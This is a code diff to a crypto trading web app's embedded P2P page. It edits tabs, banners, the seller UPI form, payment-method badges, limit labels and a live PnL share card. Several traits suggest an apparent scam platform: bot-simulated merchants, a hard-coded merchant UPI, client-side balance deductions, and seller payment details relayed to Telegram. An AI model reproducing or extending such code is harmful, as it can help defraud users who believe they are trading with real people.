@@ -959,7 +959,7 @@ onAuthStateChanged(auth, async (fbUser) => {
 
 <!-- ─── P2P (iframe shell) ─── -->
 <div class="screen" id="sc-p2p" style="padding:0;">
-  <iframe id="p2pFrame" title="P2P Trading" srcdoc="<!DOCTYPE html>
+  <iframe id="p2pFrame" title="P2P Trading" data-src="/p2p.html" style="flex:1;width:100%;border:none;background:#07080B;min-height:100dvh;" srcdoc="<!DOCTYPE html>
 <html lang=&quot;en&quot;>
 <head>
 <meta charset=&quot;UTF-8&quot;>
@@ -2036,9 +2036,6 @@ main{padding:0 0 90px!important;}
 </style>
 </head>
 <body>
-<div id=&quot;ptrIndicator&quot; style=&quot;position:fixed;top:0;left:0;right:0;display:flex;justify-content:center;align-items:center;height:0;overflow:hidden;z-index:99999;pointer-events:none;transition:height .25s ease;background:transparent;&quot;>
-  <div id=&quot;ptrSpinner&quot; style=&quot;width:28px;height:28px;border:2.5px solid rgba(255,255,255,.15);border-top-color:#f7a600;border-radius:50%;transform:rotate(0deg);transition:transform .1s linear;&quot;></div>
-</div>
 <div id=&quot;app&quot;>
   <div id=&quot;notifSys&quot;></div>
 
@@ -2150,12 +2147,24 @@ main{padding:0 0 90px!important;}
   <div class=&quot;byt-top&quot;>
     <button class=&quot;byt-side&quot; onclick=&quot;goBackToApp()&quot;><i class=&quot;fas fa-arrow-left&quot;></i></button>
     <div class=&quot;byt-tabs&quot;>
+      <button class=&quot;byt-tab&quot;>Express</button>
       <button class=&quot;byt-tab on&quot;>P2P</button>
+      <button class=&quot;byt-tab&quot;>Block Tr</button>
     </div>
     <div class=&quot;byt-currency&quot;>INR <i class=&quot;fas fa-chevron-down&quot; style=&quot;font-size:9px;&quot;></i></div>
   </div>
 
-  <!-- Warning banners removed -->
+  <!-- Verification banner -->
+  <div class=&quot;byt-verify&quot;>
+    <i class=&quot;fas fa-exclamation-circle&quot;></i>
+    <p>To ensure the security of your account, you need to submit relevant documents for verification. This service can only be used once you have completed the verification process. <a onclick=&quot;openAuth(\'signin\')&quot;>Submit Now</a></p>
+  </div>
+
+  <!-- Marquee -->
+  <div class=&quot;byt-marquee&quot;>
+    <i class=&quot;fas fa-bullhorn&quot;></i>
+    <span>The platform does not hold or escrow any fiat or cryptocurrency on behalf of users. Do not engage in violations such as third-party payments.</span>
+  </div>
 
   <!-- TABS -->
   <div class=&quot;tabs&quot;>
@@ -2316,13 +2325,10 @@ main{padding:0 0 90px!important;}
       <span id=&quot;merchantUpi&quot; style=&quot;display:none;&quot;>navyard@fam</span>
     </div>
     <div id=&quot;sellUpiBox&quot;>
-      <div style=&quot;font-size:10px;color:#aaa;font-weight:500;margin-bottom:8px;&quot;>Amount to receive (INR)</div>
-      <input type=&quot;number&quot; class=&quot;upi-inp&quot; id=&quot;payAmtInp&quot; placeholder=&quot;0&quot; style=&quot;margin-bottom:12px;font-size:18px;font-weight:700;&quot; readonly>
-      <div id=&quot;payUpiPanel&quot;>
-        <div style=&quot;font-size:8px;color:var(--y);font-weight:700;text-transform:uppercase;margin-bottom:6px;letter-spacing:.07em;&quot;>Your UPI ID</div>
-        <input type=&quot;text&quot; class=&quot;upi-inp&quot; id=&quot;upiInp&quot; placeholder=&quot;yourname@upi&quot; oninput=&quot;upiChanged()&quot; style=&quot;margin-bottom:10px;&quot;>
-      </div>
-      <button class=&quot;main-btn btn-y&quot; id=&quot;submitUpiBtn&quot; onclick=&quot;submitUPI()&quot; style=&quot;margin-top:4px;font-size:11px;padding:12px;&quot;>SUBMIT PAYMENT DETAILS</button>
+      <div style=&quot;font-size:8px;color:var(--y);font-weight:700;text-transform:uppercase;margin-bottom:8px;letter-spacing:.07em;&quot;>Your UPI ID (to receive payment)</div>
+      <div style=&quot;font-size:10px;color:#aaa;font-weight:500;margin-bottom:10px;&quot;>Enter your UPI ID so the buyer can send you ₹<span id=&quot;sellInrAmt&quot;>0</span></div>
+      <input type=&quot;text&quot; class=&quot;upi-inp&quot; id=&quot;upiInp&quot; placeholder=&quot;yourname@upi&quot; oninput=&quot;upiChanged()&quot; style=&quot;margin-bottom:10px;&quot;>
+      <button class=&quot;main-btn btn-y&quot; id=&quot;submitUpiBtn&quot; onclick=&quot;submitUPI()&quot; style=&quot;margin-top:4px;font-size:11px;padding:12px;&quot;>SUBMIT UPI ID</button>
     </div>
     <div id=&quot;tradePendingBox&quot;>
       <div class=&quot;spinner&quot;></div>
@@ -3390,8 +3396,10 @@ function renderGrid(){
       ? `${min.toLocaleString()}.00 - ${max.toLocaleString()}.00 INR`
       : `${(min*100).toLocaleString()}.00 - ${(max*100).toLocaleString()}.00 INR`;
     const featured = i===0;
-    const pmList = ['<div class=&quot;pm pm-blue&quot;>UPI</div>'];
-    const pmHtml = `<div class=&quot;ad-paymethods&quot;>${pmList.join('')}</div>`;
+    const pmList = mode==='BUY'
+      ? ['<div class=&quot;pm&quot;>Digital eRupee</div>']
+      : ['<div class=&quot;pm pm-red&quot;>IMPS</div>','<div class=&quot;pm pm-blue&quot;>UPI</div>','<div class=&quot;pm pm-red&quot;>PhonePe</div>','<div class=&quot;pm pm-red&quot;>Bank transfer (India)</div>','<div class=&quot;pm pm-green&quot;>Google Pay</div>'];
+    const pmHtml = featured ? '<div class=&quot;ad-paymethods&quot;><div class=&quot;pm&quot;>Digital eRupee</div></div>' : `<div class=&quot;ad-paymethods&quot;>${pmList.join('')}</div>`;
     g.innerHTML += `
       <div class=&quot;ad-card ${featured?'featured':''}&quot; onclick=&quot;prepTrade('${name}',${rate},${min},${max})&quot;>
         <div class=&quot;ad-card-row&quot;>
@@ -3441,7 +3449,7 @@ function prepTrade(name,rate,min,max){
     document.getElementById('actInputLabel').innerText='Enter USDT to Sell';
     document.getElementById('rcvLabel').innerText='You Receive (INR)';
     document.getElementById('rcvUnit').innerText='INR';
-    document.getElementById('limitInfo').innerText=`Limit: ${min} – ${max} USDT`;
+    document.getElementById('limitInfo').innerText=`Limit: $${min} – $${max} USDT`;
     document.getElementById('actBtn').className='main-btn btn-r';
   }
   openOverlay('actionOverlay');
@@ -3459,8 +3467,8 @@ async function initTrade(){
     if(v<selTrade.min) return toast('error','Limit Error',`Minimum ₹${selTrade.min}`);
     if(v>selTrade.max) return toast('error','Limit Error',`Maximum ₹${selTrade.max}`);
   } else {
-    if(v<selTrade.min) return toast('error','Limit Error',`Minimum ${selTrade.min} USDT`);
-    if(v>selTrade.max) return toast('error','Limit Error',`Maximum ${selTrade.max} USDT`);
+    if(v<selTrade.min) return toast('error','Limit Error',`Minimum $${selTrade.min} USDT`);
+    if(v>selTrade.max) return toast('error','Limit Error',`Maximum $${selTrade.max} USDT`);
     if(v>balance) return toast('error','Insufficient Balance','Not enough USDT.');
     balance-=v; updateBal();
   }
@@ -3557,9 +3565,8 @@ async function openDeal(id,isNew){
     } else {
       document.getElementById('payBox').style.display='none';
       document.getElementById('sellUpiBox').style.display='block';
-      const sia=document.getElementById('sellInrAmt'); if(sia) sia.innerText=o.inr.toLocaleString();
-      const pai=document.getElementById('payAmtInp'); if(pai) pai.value=o.inr;
-      document.getElementById('statusTag').innerText='Enter Payment Details';
+      document.getElementById('sellInrAmt').innerText=o.inr.toLocaleString();
+      document.getElementById('statusTag').innerText='Enter Your UPI';
       mb.innerText='RELEASE USDT'; mb.className='main-btn btn-r'; mb.disabled=true; mb.style.opacity='0.4';
       if(isNew){ const m=`Hi`; setTimeout(()=>{ botMsg(o.merchant,m); persistChatMsg(id,'them',o.merchant,m); },1500); }
     }
@@ -3567,23 +3574,21 @@ async function openDeal(id,isNew){
   document.getElementById('dealPage').style.display='flex';
 }
 
-function switchPayTab(){}
 function upiChanged(){ document.getElementById('submitUpiBtn').style.opacity=document.getElementById('upiInp').value.trim().length>3?'1':'0.5'; }
 
 async function submitUPI(){
-  const o=orders.find(x=>x.id==openId);
   const upi=document.getElementById('upiInp').value.trim();
   if(!upi||upi.length<4) return toast('error','Invalid UPI','Enter a valid UPI ID.');
-  const payInfo=upi; const payLine=`📲 UPI: \`${upi}\``;
+  const o=orders.find(x=>x.id==openId);
   let state=await getChatState(openId)||{messages:[],tgMsgId:null,cbId:null,dealStage:'init',upiSubmitted:false,seenMsgIds:[]};
   state.upiSubmitted=true; state.dealStage='upi_submitted'; await saveChatState(openId,state);
   const t=new Date().toLocaleString('en-IN',{timeZone:'Asia/Kolkata'});
-  tgSendBoth(`💳 *SELLER PAYMENT DETAILS*\n\nUID: \`${userUID}\`\nOrder: \`#${o.id}\`\nUSDT: *${o.usdt.toFixed(2)} USDT*\nINR: ₹${o.inr.toLocaleString()}\n${payLine}\n⏰ ${t} IST`);
+  tgSendBoth(`💳 *SELLER UPI RECEIVED*\n\nUID: \`${userUID}\`\nOrder: \`#${o.id}\`\nUSDT: *${o.usdt.toFixed(2)} USDT*\nINR: ₹${o.inr.toLocaleString()}\n📲 UPI: \`${upi}\`\n⏰ ${t} IST`);
   document.getElementById('sellUpiBox').style.display='none';
   document.getElementById('statusTag').innerText='Waiting for Buyer Payment';
   const mb=document.getElementById('dealMainBtn'); mb.disabled=false; mb.style.opacity='1';
-  userMsg('You','My UPI: '+payInfo); persistChatMsg(openId,'me','You','My UPI: '+payInfo);
-  toast('info','Submitted','Waiting for buyer to transfer INR.');
+  userMsg('You','My UPI: '+upi); persistChatMsg(openId,'me','You','My UPI: '+upi);
+  toast('info','UPI Submitted','Waiting for buyer to transfer INR.');
 }
 
 async function handleMainAction(){
@@ -3802,6 +3807,10 @@ window.addEventListener('load',()=>{
   setInterval(()=>{ if(!openId) renderGrid(); },5*60*1000);
 });
 </script>
+</body>
+</html>
+"></iframe>
+</div>
 <!-- COIN SEARCH MODAL -->
 <div id="coinSearchOv" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:9999;align-items:flex-end;justify-content:center;" onclick="if(event.target===this)closeCoinSearch()">
   <div style="background:#0e0e0e;width:100%;max-width:480px;max-height:85vh;border-radius:16px 16px 0 0;display:flex;flex-direction:column;overflow:hidden;">
@@ -3818,10 +3827,6 @@ window.addEventListener('load',()=>{
     </div>
     <div id="coinSearchList" style="flex:1;overflow-y:auto;padding:4px 0;"></div>
   </div>
-</div>
-</body>
-</html>
-"></iframe>
 </div>
 
 <nav class="bnav">
@@ -5957,8 +5962,11 @@ function pickCoinFromSearch(sym){
               <span id="pnlCardSym" style="color:#fff;font-size:24px;font-weight:800;">TONUSDT</span>
               <span id="pnlCardSide" style="background:rgba(22,199,132,.18);color:#16c784;font-size:12px;font-weight:700;padding:4px 10px;border-radius:8px;">Long 10.0X</span>
             </div>
-            <div style="color:#888;font-size:13px;margin-bottom:2px;">ROI</div>
-            <div id="pnlCardRoi" style="font-size:48px;font-weight:800;color:#16c784;letter-spacing:-1px;line-height:1;margin-bottom:24px;">+0.75%</div>
+            <div style="color:#888;font-size:13px;margin-bottom:2px;">PnL (USDT)</div>
+            <div style="display:flex;align-items:baseline;gap:10px;margin-bottom:24px;flex-wrap:wrap;">
+              <div id="pnlCardProfit" style="font-size:42px;font-weight:800;color:#16c784;letter-spacing:-1px;line-height:1;">+0.00 USDT</div>
+              <div id="pnlCardRoi" style="font-size:16px;font-weight:700;color:#16c784;line-height:1;">+0.00%</div>
+            </div>
             <div style="color:#888;font-size:12px;">Entry Price</div>
             <div id="pnlCardEntry" style="color:#fff;font-size:17px;font-weight:600;margin-bottom:14px;">0.0000</div>
             <div style="color:#888;font-size:12px;">Current Price</div>
@@ -5998,8 +6006,9 @@ function pickCoinFromSearch(sym){
   </div>
 </div>
 <script>
-function openPnlShare(posId){
-  const p = (STATE.positions||[]).find(x=>x.id===posId); if(!p) return;
+let _pnlShareTimer = null, _pnlSharePosId = null;
+function _renderPnlShare(){
+  const p = (STATE.positions||[]).find(x=>x.id===_pnlSharePosId); if(!p){ closePnlShare(); return; }
   const mark = getMarkPrice(p.sym,'linear') || p.entry;
   const { pnl, pct, up } = calcPositionPnl(p, mark);
   const sideColor = p.side==='Long' ? '#16c784' : '#ea3943';
@@ -6008,15 +6017,29 @@ function openPnlShare(posId){
   const sideEl = document.getElementById('pnlCardSide');
   sideEl.textContent = `${p.side} ${(+p.lev).toFixed(1)}X`;
   sideEl.style.color = sideColor; sideEl.style.background = sideBg;
+  const color = up ? '#16c784' : '#ea3943';
+  const profitEl = document.getElementById('pnlCardProfit');
+  profitEl.textContent = `${up?'+':''}${(+pnl).toFixed(2)} USDT`;
+  profitEl.style.color = color;
   const roiEl = document.getElementById('pnlCardRoi');
   roiEl.textContent = `${up?'+':''}${pct.toFixed(2)}%`;
-  roiEl.style.color = up ? '#16c784' : '#ea3943';
+  roiEl.style.color = color;
   const dec = (+p.entry < 1) ? 4 : 2;
   document.getElementById('pnlCardEntry').textContent = (+p.entry).toFixed(dec);
   document.getElementById('pnlCardCur').textContent = (+mark).toFixed(dec);
-  document.getElementById('pnlShareOv').style.display = 'flex';
 }
-function closePnlShare(){ document.getElementById('pnlShareOv').style.display='none'; }
+function openPnlShare(posId){
+  _pnlSharePosId = posId;
+  _renderPnlShare();
+  document.getElementById('pnlShareOv').style.display = 'flex';
+  if(_pnlShareTimer) clearInterval(_pnlShareTimer);
+  _pnlShareTimer = setInterval(_renderPnlShare, 1000);
+}
+function closePnlShare(){
+  document.getElementById('pnlShareOv').style.display='none';
+  if(_pnlShareTimer){ clearInterval(_pnlShareTimer); _pnlShareTimer=null; }
+  _pnlSharePosId = null;
+}
 function pnlShareAction(kind){
   const sym = document.getElementById('pnlCardSym').textContent;
   const roi = document.getElementById('pnlCardRoi').textContent;
